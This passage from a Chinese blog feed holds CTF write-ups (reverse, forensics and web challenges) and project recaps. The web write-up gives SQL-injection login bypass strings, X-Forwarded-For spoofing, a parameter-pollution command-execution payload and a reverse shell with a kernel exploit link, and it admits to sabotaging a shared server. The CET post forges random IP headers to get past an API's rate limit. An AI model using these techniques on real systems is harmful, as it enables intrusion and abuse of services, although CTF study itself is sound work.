class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf8 -*-</span></span><br><span class="line">cnt = <span class="number">0</span></span><br><span class="line">a1=<span class="number">0</span></span><br><span class="line">a2=<span class="number">0</span></span><br><span class="line">a3=<span class="number">0</span></span><br><span class="line">a4=<span class="number">0</span></span><br><span class="line">a5=<span class="number">0</span></span><br><span class="line">a6=<span class="number">0</span></span><br><span class="line">a7=<span class="number">0</span></span><br><span class="line">a8=<span class="number">0</span></span><br><span class="line">a9=<span class="number">0</span></span><br><span class="line">a10=<span class="number">0</span></span><br><span class="line">a11=<span class="number">0</span></span><br><span class="line">a12=<span class="number">5</span></span><br><span class="line">a13=<span class="number">0</span></span><br><span class="line">a14=<span class="number">0</span></span><br><span class="line">a15=<span class="number">0</span></span><br><span class="line">a16=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> a1 <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">27</span>):</span><br><span class="line"> <span class="keyword">if</span> <span class="number">0x15</span>&lt;=a1:</span><br><span class="line">  <span class="keyword">continue</span></span><br><span class="line"> a9=a1</span><br><span class="line"> a10=a1</span><br><span class="line"> <span class="keyword">for</span> a2 <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">27</span>):</span><br><span class="line">  a11=a2</span><br><span class="line">  <span class="keyword">if</span> a2&lt;=<span class="number">7</span>:</span><br><span class="line">   <span class="keyword">continue</span></span><br><span class="line">  <span class="keyword">for</span> a3 <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">27</span>):</span><br><span class="line">   <span class="keyword">if</span> a3%<span class="number">3</span>!=<span class="number">0</span>:</span><br><span class="line">    <span class="keyword">continue</span></span><br><span class="line">   a5=a3</span><br><span class="line">   <span class="keyword">if</span> a3&lt;=a2:</span><br><span class="line">    <span class="keyword">continue</span></span><br><span class="line">   <span class="keyword">for</span> a4 <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">27</span>):</span><br><span class="line">    a6=a4</span><br><span class="line">    <span class="keyword">if</span> a1&lt;=a4:</span><br><span class="line">     <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">for</span> a16 <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">27</span>):</span><br><span class="line">     a7=<span class="number">2</span>*a16</span><br><span class="line">     <span class="keyword">if</span> a1&gt;=a7:</span><br><span class="line">      ad=a1-a7</span><br><span class="line">     <span class="keyword">else</span>:</span><br><span class="line">      <span class="keyword">continue</span></span><br><span class="line">     <span class="keyword">if</span> a7&lt;=a3:</span><br><span class="line">      <span class="keyword">continue</span></span><br><span class="line">     a12=<span class="number">5</span></span><br><span class="line">     <span class="keyword">if</span> <span class="number">1</span>==<span class="number">1</span>:</span><br><span class="line">      a8=<span class="number">3</span>*a12</span><br><span class="line">      <span class="keyword">for</span> a13 <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">27</span>):</span><br><span class="line">       a14=<span class="number">2</span>*a13</span><br><span class="line">       <span class="keyword">if</span> a4&lt;=<span class="number">3</span>*a13:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">       <span class="keyword">for</span> a15 <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">27</span>):</span><br><span class="line">        <span class="keyword">if</span> a13&lt;=<span class="number">5</span>*a15:</span><br><span class="line">         <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> a3&lt;=<span class="number">4</span>*a15:</span><br><span class="line">         <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">print</span> chr(a1+<span class="number">96</span>)+chr(a2+<span class="number">96</span>)+chr(a3+<span class="number">96</span>)+chr(a4+<span class="number">96</span>)+chr(a5+<span class="number">96</span>)+chr(a6+<span class="number">96</span>)+chr(a7+<span class="number">96</span>)+chr(a8+<span class="number">96</span>)+chr(a9+<span class="number">96</span>)+chr(a10+<span class="number">96</span>)+chr(a11+<span class="number">96</span>)+chr(a12+<span class="number">96</span>)+chr(a13+<span class="number">96</span>)+chr(a14+<span class="number">96</span>)+chr(a15+<span class="number">96</span>)+chr(a16+<span class="number">96</span>)</span><br></pre></td></tr></table></figure><p>得到</p><p><img src="http://oayoilchh.bkt.clouddn.com/2016/09/11/09:36:03%20" alt=""></p><p>访问程序得到一个地址  访问地址  <strong><a href="http://reverse..cn/galfehttonsisiht.php" target="_blank" rel="noopener">http://reverse..cn/galfehttonsisiht.php</a></strong><br>就能得到flag了</p><h1 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h1><h3 id="1、蒲公英的约定"><a href="#1、蒲公英的约定" class="headerlink" title="1、蒲公英的约定"></a>1、蒲公英的约定</h3><blockquote><p>蒲公英的约定<br>100<br>题目描述？小学篱笆旁的 蒲公英~</p></blockquote><p>这个简单 使用stegsolve打开</p><p><img src="http://oayoilchh.bkt.clouddn.com/2016/09/11/09:42:55%20" alt=""></p><p>能看到一个二维码</p><p>反转一下颜色 然后 扫描就得到一个类似base64字符串，但其实是base32字符串，用python的base64.b32decode即可得到flag</p><p>###2、什么鬼(100)</p><blockquote><p>什么鬼</p></blockquote><p>你瞅啥？</p><p>binwal解压出一个压缩包</p><p>压缩包是有密码的  注释上写的4位数<br>爆破  得到密码 19bZ<br>打开压缩包是一个破损的二维码 PS一下就好了</p><p><img src="http://oayoilchh.bkt.clouddn.com/2016/09/11/09:45:42%20" alt=""></p><p>###3、客官，听点小曲儿？</p><p>这题的mp3地址不是直接提供的，而是提供了一个网站，留意网页的header，里面有key为cherrs，而mp3最常见的隐写术就是mp3Stego，找一个解密即可<br><code>Decode –X song.mp3 –P cheers</code><br>得到<br><code>fdc3_#l{tsf#ahfte}gs:en_hmgcX_poe</code><br>就会生成文件，文件里内容是经过不规则的栅栏加密过，只要自己手工按照flag形式去调整下即可。<br><code>flag_Xd{hSh_ctf:mp3stego_fence}</code></p><h3 id="4、网红之路"><a href="#4、网红之路" class="headerlink" title="4、网红之路"></a>4、网红之路</h3><p>这个比赛之后才做出来的</p><p><img src="http://oayoilchh.bkt.clouddn.com/2016/09/11/09:52:33%20" alt=""></p><p>接着就是简单的编码问题了</p><h1 id="Finally"><a href="#Finally" class="headerlink" title="Finally"></a>Finally</h1><p>一个安卓都没做出来   好尴尬。。。。</p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-9-11/99289129.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;题目打包下载：&lt;a href=&quot;&quot;&gt;https://yunpan.cn/ckyrKxHJDPAIN&lt;/a&gt; （提取码：bbaf）&lt;/p&gt;
&lt;h1 id=&quot;Web&quot;&gt;&lt;a href=&quot;#Web&quot; class=&quot;headerlink&quot; title=&quot;Web&quot;&gt;&lt;/a&gt;Web&lt;/
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>中国软件杯比赛总结</title>
    <link href="https://www.ycjcl.cc/2018/07/08/%E4%B8%AD%E5%9B%BD%E8%BD%AF%E4%BB%B6%E6%9D%AF%E6%AF%94%E8%B5%9B%E6%80%BB%E7%BB%93/"/>
    <id>https://www.ycjcl.cc/2018/07/08/中国软件杯比赛总结/</id>
    <published>2018-07-07T17:14:41.000Z</published>
    <updated>2018-07-07T17:15:04.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>2016年8月22号-26号，在南京航空航天大学举办<strong>第五届中国软件杯大学生软件设计大赛</strong>。很幸运，进入决赛，赛题为：A4-基于web的3D模型浏览与交互系统。</p></blockquote><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-8-28/6209250.jpg" alt=""></p><p>2017年寒假学了下<code>Sketch</code>，更新下有点逼格的设计图：</p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-2-20/87912624-file_1487566622503_31fa.png" alt=""></p><p>####简述</p><hr><p>比赛分为两轮: 第一轮是指导老师 + 校企（占比多），通过在线演示选出进入答辩的队伍（争夺特、一等奖）。第二轮是答辨环节，通过PPT讲解作品。</p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-8-28/37273929.jpg" alt=""></p><p>Unluckily,没有进入答辩环节。但我认为作品做的不比南/北航(晋级答辩环节的两支队伍)逊色。好吧，只拿了三等奖。😭</p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-8-28/15352511.jpg" alt=""></p><blockquote><p>下面介绍下作品吧</p></blockquote><p>####首页</p><hr><p>首先进入的是开场部分，然后点击上传模型。</p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-8-23/7611547.jpg" alt=""></p><p>####上传页</p><hr><p> 支持十种以上常用的3D模型格式，首先下载一个step格式的模型文件。点击上传。<br> 因为使用的是OSS对象存储，上传的时候先创建一个容器，然后开始上传模型文件，上传成功后，对模型文件进行解析，解析成功后直接跳转到展示页。</p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-8-23/1296023.jpg" alt=""></p><p>####展示页</p><hr><p>这个就是刚刚上传解析出来的模型，对模型进行浏览，进行基本的浏览操作（旋转、缩放、剖切、拆分）</p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-8-23/1190578.jpg" alt=""></p><p>然后对图元的拾取（框取、点选、测量）</p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-8-23/43686836.jpg" alt=""></p><p>外观编辑（着色）</p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-8-23/1969687.jpg" alt=""></p><p>其中有一个特色功能，就是多人实时在线浏览 ，采用了Socket.IO进行实时在线，并采用Nginx的负载均衡 + NodeJS异步I/O操作来支撑高并发。<br><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-8-23/89525498.jpg" alt=""></p><p>####总结</p><hr><ul><li>看到了广东学校做的VR很棒，于是回校的第一天晚上就加了这个功能。</li></ul><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-8-28/51482139.jpg" alt=""></p><ul><li>学长告诉我，这个比赛扣赛题的得分点扣得很严，所以我就在演示时，特意做了一个脑图，一步步按得分点演示。</li></ul><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-8-28/69404193.jpg" alt=""></p><ul><li>总得来说，中软杯办得相当好。颁奖典礼真的是我目前见过只高端的典礼，还有新装起来的餐厅。点个赞。👍</li></ul><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-8-28/5698657.jpg" alt=""></p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-8-28/59955591.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;2016年8月22号-26号，在南京航空航天大学举办&lt;strong&gt;第五届中国软件杯大学生软件设计大赛&lt;/strong&gt;。很幸运，进入决赛，赛题为：A4-基于web的3D模型浏览与交互系统。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img sr
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>四六级查询demo总结</title>
    <link href="https://www.ycjcl.cc/2018/07/08/%E5%9B%9B%E5%85%AD%E7%BA%A7%E6%9F%A5%E8%AF%A2demo%E6%80%BB%E7%BB%93/"/>
    <id>https://www.ycjcl.cc/2018/07/08/四六级查询demo总结/</id>
    <published>2018-07-07T17:14:02.000Z</published>
    <updated>2018-07-07T17:14:25.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>7月份时，闲着无聊，做了一个全国四六级的查询，体会了独立从设计、前端、后台、开发、部署、推广、服务器运维的过程，现做个总结。<a href="http://cet.ycjcl.cc" target="_blank" rel="noopener">demo演示</a></p></blockquote><p>当天的PV量和IP量：</p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-8-21/83481037.jpg" alt=""></p><hr><p>####前端<br>因为是在手机上访问的，所以前端UI层其实没多大量。我个人比较喜欢像<strong>Google</strong>、<strong>苹果</strong>、<strong>微信</strong>的设计，所以前端的UI层采用了<a href="http://weui.io" target="_blank" rel="noopener"><code>WeUI</code></a>，交互层的JS框架采用了<a href="http://cn.vuejs.org" target="_blank" rel="noopener"><code>VueJS</code></a> + <a href="http://zeptojs.com/" target="_blank" rel="noopener"><code>Zepto</code></a>。写CSS时就使用的<code>Less</code>预处理(Less直接一保存，自动转成CSS)。</p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-8-22/11294235.jpg" alt=""></p><p>####后端<br>后端为了支持短时间内的高并发，使用了<code>NodeJS</code>。非阻塞的异步I/O操作果然很强势。数据库连接开启了<code>pool</code>连接池和索引，查询起来压力不大。</p><p>####服务器<br>其实最大的考验在于服务器的支撑上，买了两台学生机（阿里云9.9元 + 腾讯云1元）😂做的负载均衡</p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-8-22/16013969.jpg" alt=""></p><p>为了不给服务器大的压力，前端将该压缩的都压缩了。从<strong>html</strong>、<strong>CSS</strong>、<strong>js</strong>、<strong>图片</strong>全都压缩。</p><p>然后用<code>tingyun</code>看了一下监测：</p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-8-22/1087078.jpg" alt=""></p><p>最后的访问量用百度统计看了一下，感觉一般，毕竟不是官方推荐的入口，只是自己心血来潮做个玩玩，同时免准考证查询接口临时改加密算法也是无奈。<a href="http://mp.weixin.qq.com/s?__biz=MzA5NTIxOTg4Ng==&amp;mid=2459553686&amp;idx=1&amp;sn=865e36dbb33e8f1a91e1886d1b350550&amp;scene=1&amp;srcid=0820cy3wk1L8aHTmqGTLfk8G#rd" target="_blank" rel="noopener">推文</a>写的也不是很好。</p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-8-22/76553376.jpg" alt=""></p><p>####不足之处</p><ul><li>当时测试调用<code>学信网</code>接口时，没有加<code>XFF</code>头，导致了查询当天，查询了大概10几个分数后，就无法使用了。没办法，马上写了一个<code>RandomIp()</code>的方法。</li></ul><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-8-22/350532.jpg" alt=""></p><ul><li>抓取完后，解析<strong>学信网</strong>宿舍信息时，用的是正则表达式，写了很长，没有用<code>cheerio</code>模块。</li></ul><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-8-22/20309480.jpg" alt=""></p><ul><li>原先测试时，<code>99宿舍</code>免准考证查询是可以用的，结果出分的前一天晚上，换了加密算法。导致除<code>99宿舍</code>的所有第三方都无法查到准考证号。然后临时将<strong>免准考证查询</strong>的选项卡去除。</li></ul><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-8-22/39685576.jpg" alt=""></p><ul><li>第一次处理那种大量用户查询服务，像这种服务有这样的特点：<strong>不确定性</strong>、<strong>即时性</strong>、<strong>高并发性</strong>，查询前一天晚上发现免准接口用不了了，心里是崩溃的。同时也就隐隐感受到了淘宝双十一时的那种心情，真的是一个传奇。</li></ul><p>####附目录结构<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">项目目录结构</span><br><span class="line">├── api.js</span><br><span class="line">├── app.js</span><br><span class="line">├── bin</span><br><span class="line">│   └── www</span><br><span class="line">├── conf</span><br><span class="line">│   └── db.js</span><br><span class="line">├── demo.html</span><br><span class="line">├── gulpfile.js</span><br><span class="line">├── node_modules</span><br><span class="line">├── package.json</span><br><span class="line">├── public</span><br><span class="line">│   ├── bower.json</span><br><span class="line">│   ├── bower_components</span><br><span class="line">│   ├── css</span><br><span class="line">│   ├── favicon.ico</span><br><span class="line">│   ├── images</span><br><span class="line">│   ├── js</span><br><span class="line">│   └── min</span><br><span class="line">├── routes</span><br><span class="line">│   ├── index.js</span><br><span class="line">│   └── users.js</span><br><span class="line">└── views</span><br><span class="line">    ├── error.ejs</span><br><span class="line">    └── index.ejs</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;7月份时，闲着无聊，做了一个全国四六级的查询，体会了独立从设计、前端、后台、开发、部署、推广、服务器运维的过程，现做个总结。&lt;a href=&quot;http://cet.ycjcl.cc&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;d
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>全国高校网安联赛Web专场~WriteUp</title>
    <link href="https://www.ycjcl.cc/2018/07/08/%E5%85%A8%E5%9B%BD%E9%AB%98%E6%A0%A1%E7%BD%91%E5%AE%89%E8%81%94%E8%B5%9BWeb%E4%B8%93%E5%9C%BA~WriteUp/"/>
    <id>https://www.ycjcl.cc/2018/07/08/全国高校网安联赛Web专场~WriteUp/</id>
    <published>2018-07-07T17:13:19.000Z</published>
    <updated>2018-07-07T17:13:33.000Z</updated>
    
    <content type="html"><![CDATA[<p>###1、Sign</p><blockquote><p>题目：Good Luck！flag{X-nuca@GoodLuck!}</p></blockquote><p>Flag直接写在题目上了，<code>flag{X-nuca@GoodLuck!}</code></p><p>###2、BaseCoding</p><blockquote><p>提示：这是编码不是加密哦!一般什么编码里常见等号？<br>题目：这一串字符好奇怪的样子，里面会不会隐藏什么信息？<a href="http://question1.erangelab.com/" target="_blank" rel="noopener">http://question1.erangelab.com/</a><br>Base64……</p></blockquote><p>访问后得到一串含有等号的字符，然后base64解码得到flag</p><p>###3、BaseInjection</p><blockquote><p>提示：试试万能密码<br>题目：不知道密码也能登录。<a href="http://question2.erangelab.com/" target="_blank" rel="noopener">http://question2.erangelab.com/</a></p></blockquote><p>万能密码  1‘or’1’=’1’<br>轻松拿到flag</p><p>###4、BaseReconstruction</p><blockquote><p>提示：对数据包进行重构是基本技能<br>题目：此题看似和上题一样，其实不然。<a href="http://question3.erangelab.com/" target="_blank" rel="noopener">http://question3.erangelab.com/</a></p></blockquote><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-7-31/50886843.jpg" alt=""></p><p><code>flag{Cr05sthEjava5cr1pt}</code></p><p>###5、CountingStars</p><blockquote><p>提示：一不小心Mac也侧漏<br>题目：No more $s counting stars. <a href="http://question4.erangelab.com/" target="_blank" rel="noopener">http://question4.erangelab.com/</a><br>查看源码可以看到有个提示是说mac系统的，所以直接下载DS_Store，里面可以看到有一个zip</p></blockquote><p>在<code>http://question4.erangelab.com/.DS_Store</code>查看源码，发现这么一个名字的压缩包 把压缩包下载来后。</p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-7-31/670690.jpg" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$S=&quot;song&quot;;</span><br><span class="line">$song=&quot;says&quot;;</span><br><span class="line">$says=&quot;no&quot;;</span><br><span class="line">$no=&quot;more&quot;;</span><br><span class="line">$more=&quot;d0llars&quot;;</span><br><span class="line">$d0llars=&quot;counting&quot;;</span><br><span class="line">$counting=&quot;star&quot;;</span><br><span class="line">$star=&quot;S&quot;;</span><br><span class="line">echo &apos;&lt;div style=&quot;text-align:center&quot;&gt;What is $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$S&lt;/div&gt;&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>应该是变量覆盖，直接<code>echo $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$S</code>解出来是<code>d0llars</code></p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-7-31/20812182.jpg" alt=""></p><p>###6、Invisible</p><blockquote><p>题目：隐藏IP来保护自己。<a href="http://121.195.186.234" target="_blank" rel="noopener">http://121.195.186.234</a></p></blockquote><p>发包时直接改<code>X-Forwarded-For:127.0.0.1</code></p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-7-31/93672064.jpg" alt=""></p><p>###7、Normal_normal</p><blockquote><p>提示：phpwind 后台getxxxxx<br>题目：又是一个bbs。<a href="http://question6.erangelab.com/" target="_blank" rel="noopener">http://question6.erangelab.com/</a></p></blockquote><p>126邮箱社工拿到后台用户名和密码:<code>zhangrendao  zhang2010</code></p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-8-1/41934336.jpg" alt=""></p><p>登录后台 翻了下XML  最后拿到Flag</p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-8-1/30764935.jpg" alt=""></p><p><code>flag{n0rmal_meth0d_n0rmal_l1fe}</code></p><p>###8、DBexplorer</p><blockquote><p>提示：a.SELECT @@datadir 。。。mysql/user.MYD b.user.MYD<br>题目：Where is my data。<a href="http://question7.erangelab.com/（请不要修改密码！）" target="_blank" rel="noopener">http://question7.erangelab.com/（请不要修改密码！）</a></p></blockquote><p>提示vim，看<code>db.php.swp</code>文件，找到了用户名和密码<code>ctfdb  ctfmysql123</code>，还有phpmyadmin的地址。但权限不够。</p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-8-1/66830417.jpg" alt=""></p><p>无意中，看到大牛们导出时出现了这个：</p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-8-1/79136926.jpg" alt=""></p><p>然后用<code>topsec  topsec123456</code>登陆进去拿到flag</p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-8-1/56027448.jpg" alt=""></p><p>###9、RotatePicture</p><blockquote><p>提示：urlopen file schema<br>题目：转转转。<a href="http://question8.erangelab.com/picrotate" target="_blank" rel="noopener">http://question8.erangelab.com/picrotate</a></p></blockquote><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-8-1/5643835.jpg" alt=""></p><p>首先可以看源码，得到<br><a href="http://question8.erangelab.com/getredisvalue" target="_blank" rel="noopener">http://question8.erangelab.com/getredisvalue</a><br>然后找了个paper<code>http://www.tuicool.com/articles/fE7nMv3</code>，是Python urllib HTTP Header Injection。<br>方法就是先设置uuid，然后再get uuid。<br>这样get uuid 就等于get flag<br><code>flag{url0pen_1s_1nterest1ng}</code></p><p>###10、AdminLogin</p><blockquote><p>题目：On the way in。<a href="http://121.195.186.238/index.php" target="_blank" rel="noopener">http://121.195.186.238/index.php</a></p></blockquote><p>点击进去好像有个链接 然后是我队友注入跑出来了账号密码</p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-7-31/18238161.jpg" alt=""></p><p>解出来是<br><code>Ctfadmin    admininistrat0r</code><br>然后尝试去登陆 发现死活登陆不了  看看返回信息。经师傅提示，找到了svn目录，找到了路径。</p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-7-31/18264019.jpg" alt=""></p><p>好吧 要伪造IP  那简单啦 X-Forwarded-For 轻松解决一切</p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-7-31/32635280.jpg" alt=""></p><p>返回了一个图片的包 这个图片base64 那么用base64解出来图片应该就能看到flag了<br>拿到火狐解一下</p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-7-31/91009013.jpg" alt=""></p><p>###11、WeirdCamel(白师傅做的)</p><blockquote><p>提示：a.小骆驼的%和@真是蛋疼 b.嗯……URL转义有时候会失效 c.也许变量能够覆盖哦<br>题目：欢迎报名夏令营，请您仔细阅读公告，之后我们将会审核您的报名信息。<a href="http://question10.erangelab.com/" target="_blank" rel="noopener">http://question10.erangelab.com/</a></p></blockquote><p>这个一开始完全没思路，500太坑，最后又来了个提示，变量覆盖（post:name=a&amp;name=STATEMENT&amp;name=register.pl），直接拿到了源码</p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-8-1/13727897.jpg" alt=""></p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-8-1/82014747.jpg" alt=""></p><p>可以直接命令执行（post: name=1&amp;name=STATEMENT&amp;name=|ls|）<br>然后翻了下目录，没找到flag，不过有个xnuca_looktheregisternews.pl</p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-8-1/76746107.jpg" alt=""></p><p>源码:</p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-8-1/21303771.jpg" alt=""></p><p>然后就是弹shell了，上py脚本，直接反弹shell出来<br>登mysql提示：<br>Access denied for user ‘xnuca_user‘@’localhost’ to database ‘xnuca_news_db’ when using LOCK TABLES<br>我服，写了个py脚本去读所有字段，提示：<br>ImportError: No module named MySQLdb<br>我服，还打算写个php的，后来发现内核版本有点老啊，ubuntu的，上exp<br><a href="https://www.exploit-db.com/exploits/37292/" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/37292/</a></p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-8-1/7953510.jpg" alt=""></p><p>我服，又穿了，中午穿过一次了……<br>最后看师傅们都在使劲传脚本，弹shell，无奈了，太菜害怕被超，最后十几分钟干了点缺德事，抱歉抱歉……</p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-8-1/45618409.jpg" alt=""></p><p>不过最后发现，删了以后有点亏，因为拿到了root密码xgsqggxwalspassw0rd，不知道是否通用啊，如果通用的话，那500也就可以拿下了……Orz</p><p>###12、OneWayIn</p><blockquote><p>题目：How can I get in。<a href="http://question11.erangelab.com/" target="_blank" rel="noopener">http://question11.erangelab.com/</a></p></blockquote><p>查看源码，发现<code>crc32($_POST[&#39;0kee_username&#39;]) === crc32($_POST[&#39;0kee_password&#39;])</code>，弱类型数组绕过。<br><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-7-31/48845989.jpg" alt="">，url有一个任意文件读取，file参数值需要base64编码一下，num参数是读取第几行数，尝试着读取<code>index.php</code>源码，得到：</p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-7-31/62064630.jpg" alt=""></p><p>做一下代码审计，发现，当<code>cookie</code>设置<code>role_cookie=flagadmin</code>时，才可以读取<code>flag.php</code>文件。读了一下发现<code>flag.php</code>被<code>phpjiami</code>加密了</p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-7-31/99272920.jpg" alt=""></p><p>于是解密得：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$iipp=$_SERVER[&quot;HTTP_HOST&quot;];</span><br><span class="line">if ($iipp === &apos;127.0.0.1&apos;) &#123;</span><br><span class="line">echo &apos;ADwAcwBjAHIAaQBwAHQAPgBmAGwAYQBnAHsATAB6AFUAVgB6AEQATwBvAHgAeQBlAG4AYwA4AHAAagBUADkAdwBlAG8AUgB1AE4ATgBJAE8ATQA0AGIAUQAyAH0APAAvAHMAYwByAGkAcAB0AD4&apos;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">echo &apos;We need local...&apos;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>直接base64解密一下，得到flag</p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-7-31/17441357.jpg" alt=""></p><hr><p>Team: JSSec<br>School: 西安科技大学</p><hr><p>最后打进决赛了：</p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/public/16-12-4/10241653.jpg" alt=""></p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/public/16-12-4/44623095.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;###1、Sign&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;题目：Good Luck！flag{X-nuca@GoodLuck!}&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Flag直接写在题目上了，&lt;code&gt;flag{X-nuca@GoodLuck!}&lt;/code&gt;&lt;/
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>腾讯云极速配置NodeJS+LNMP运行环境</title>
    <link href="https://www.ycjcl.cc/2018/07/08/%E8%85%BE%E8%AE%AF%E4%BA%91%E6%9E%81%E9%80%9F%E9%85%8D%E7%BD%AENodeJS+LNMP%E8%BF%90%E8%A1%8C%E7%8E%AF%E5%A2%83/"/>
    <id>https://www.ycjcl.cc/2018/07/08/腾讯云极速配置NodeJS+LNMP运行环境/</id>
    <published>2018-07-07T17:12:40.000Z</published>
    <updated>2018-07-07T17:12:59.000Z</updated>
    
